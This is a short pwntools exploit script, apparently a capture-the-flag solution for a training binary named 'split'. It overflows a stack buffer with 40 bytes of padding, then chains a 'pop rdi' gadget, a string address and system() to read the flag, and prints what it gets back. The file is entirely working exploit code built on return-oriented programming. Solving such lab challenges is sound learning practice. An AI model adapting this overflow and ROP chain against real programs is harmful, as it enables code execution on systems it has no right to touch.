from pwn import *

elf = context.binary = ELF('split')

system = p64(0x0000000000400810)
cat = p64(0x00601060)

pop_rdi = p64(0x0000000000400883)

pad = "A"*40
rop = pop_rdi + cat + system

payload = pad + rop

io = process(elf.path)

# send exploit string
io.sendline(payload)

# get flag
io.recvuntil("> ")
flag = io.recvline()

success(flag)
